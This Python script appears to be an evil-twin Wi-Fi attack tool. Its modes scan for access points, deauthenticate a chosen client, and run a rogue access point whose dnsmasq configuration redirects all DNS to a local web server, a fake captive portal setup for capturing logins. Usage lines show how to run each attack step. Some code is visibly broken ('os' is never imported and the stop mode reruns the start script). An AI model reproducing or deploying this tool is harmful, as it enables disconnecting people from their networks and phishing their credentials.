import sys, getopt
from ap_deauth import deauth


def printUsage():
    print("usage: captive_portal_atk.py <mode> <extra variables>")
    print("\n")

    print("running modes: \n")
    print("-h help")
    print("-s scan        : Scan for Access Point")
    print("-u deauth      : Deauthenticate client from Access Point")
    print("-r run-ap      : Run Access Point")
    print("-t stop        : Stop Access Point")

    print("\n")

    print("extra variables: \n")
    print("-i interface   : Select Interface")
    print("-b bssid       : MAC address, Access Point")
    print("-d dmac        : MAC address, Destination")
    print("-c channel     : Access Point channel")

    print("\n")

    print("how to run: \n")
    print("sudo python3 captive_portal_atk.py -s -i <interface>")
    print("sudo python3 captive_portal_atk.py -u -i <interface> -b <bssid> -d <dmac> -c <channel>")
    print("sudo python3 captive_portal_atk.py -r -i <interface> -c <channel> -n <ssid> -e <eth>")
    print("sudo python3 captive_portal_atk.py -t -i <interface>")

def changeToMonitorMode(interface):
    #change to monitor mode without airmon
    #os.system("sudo ifconfig %s down" %(interface))
    #os.system("sudo iwconfig %s mode monitor" %(interface))
    #os.system("sudo ifconfig %s up" %(interface))

    #change to monitor mode with airmon
    os.system("sudo airmon-ng start %s" %(interface))
    print("changed interface %s to monitor mode" %(interface))

def handle_scan(interface):
    #run the ap_scanner script
    os.system("sudo python3 ap_scanner.py %s" %(interface))

def handle_deauth(interface, bssid, dmac):
    #change channel
    os.system("sudo iwconfig %s channel %s" %(interface, channel))
    deauth(interface, bssid, dmac)

def handle_run_ap(interface, ssid, channel, eth):
    #define the content of dnsmasq.conf file
    dnsmasq_conf = ""
    dnsmasq_conf += "#Set the wireless interface\ninterface=%s\n\n" %(interface)
    dnsmasq_conf += "#Set the IP range for the clients\ndhcp-range=192.168.44.100,192.168.44.200,12h\n\n"
    dnsmasq_conf += "#Set the gateway IP address\ndhcp-option=3,192.168.44.1\n\n"
    dnsmasq_conf += "#Set the DNS server address\ndhcp-option=6,192.168.44.1\n\n" 
    dnsmasq_conf += "#Send any host to a local web-server\naddress=/#/192.168.44.1"

    #define the content of hostapd.conf file
    hostapd_conf = "interface=%s\ndriver=nl80211\nssid=%s\nchannel=%s" %(interface, ssid, channel)

    #remove old dnsmasq.conf file
    os.remove("dnsmasq.conf")

    #open new dnsmasq.conf file
    f = open("dnsmasq.conf", "a")

    #write dnsmasq_conf to dnsmasq.conf
    f.write(dnsmasq_conf)

    #close file
    f.close()

    #remove old hostapd.conf file
    os.remove("hostapd.conf")

    #open new hostapd.conf file
    f = open("hostapd.conf", "a")

    #write hostapd to hostapd.conf
    f.write(hostapd_conf)
    
    #close file
    f.close()

    #change channel
    os.system("sudo iwconfig %s channel %s" %(interface, channel))

    #enable nat
    os.system("sudo iptables -t nat -A POSTROUTING -o %s -j MASQUERADE" %(eth))

    #restart apache2 server
    os.system("sudo service apache2 restart")

    #start hostapd and dnsmasq
    os.system("sudo bash run_ap.sh")

def handle_stop(interface):
    #stop hostapd and dnsmasq
    os.system("sudo bash run_ap.sh")
    os.system("sudo airmon-ng stop %s" %(interface))
    sys.exit()

if __name__ == "__main__":

    #declare variables
    mode = None
    interface = None
    bssid = None
    dmac = None
    channel = None
    ssid = None
    eth = None
    commandLineArgs = sys.argv[1:]

    shortOptions = "hsuri:b:d:c:n:e:t:"
    longOptions = ["help", "scan", "deauth", "run-ap", "interface=", "bssid=", "dmac=", "channel=", "ssid=", "eth=", "stop"]
    opts, args = getopt.getopt(commandLineArgs, shortOptions ,longOptions)
    print(opts, args)


    for opt, arg in opts:
        if opt == '-h' or opt == '--help':
            printUsage()
            sys.exit()
        elif opt == '-t' or opt == '--stop':
            mode = "stop"
            print("mode selected: <stop>")
        elif opt == '-s' or opt == '--scan':
            mode = "scan"
            print("mode selected: <scan>")
        elif opt == '-u' or opt == '--deauth':
            mode = "deauth"
            print("mode selected: <deauth>")
        elif opt == '-r' or opt == '--run-ap':
            mode = "run-ap"
            print("mode selected: <run-ap>")
        elif opt == '-i' or opt == '--interface':
            interface = arg
            print("interface selected: <%s>" %(arg))
        elif opt == '-b' or opt == '--bssid':
            bssid = arg
            print("bssid selected: <%s>" %(arg))
        elif opt == '-d' or opt == '--dmac':
            dmac = arg
            print("dmac selected: <%s>" %(arg))
        elif opt == '-c' or opt == '--channel':
            channel = arg
            print("channel selected: <%s>" %(arg))
        elif opt == '-n' or opt == '--ssid':
            ssid = arg
            print("ssid selected: <%s>" %(arg))
        elif opt == '-e' or opt == '--eth':
            eth = arg
            print("eth selected: <%s>" %(arg))

    if mode != None and interface != None:
        print("killing processes")
        #kill all interfering processes
        os.system("sudo killall NetworkManager dnsmasq wpa_supplicant dhcpd isc-dhcp-server")
        changeToMonitorMode(interface)
        interface += "mon"
        #define interface address
        os.system("sudo ifconfig %s 192.168.44.1 netmask 255.255.255.0" %(interface))
    else:
        sys.exit("mode or interface was not selected, for more info run as -h or --help")
    if mode == "scan":
            handle_scan(interface)
    elif mode == "deauth":
        if bssid != None and dmac != None and channel != None:
            handle_deauth(interface, bssid, dmac)
        else:
            sys.exit("mode selected: <deauth> but did not recieve enough args")
    elif mode == "run-ap":
        if channel != None and ssid != None and eth != None:
            handle_run_ap(interface, ssid, channel, eth)
        else:
            sys.exit("mode selected: <run-ap> but did not recieve enough args")
    elif mode == "stop":
        handle_stop(interface)
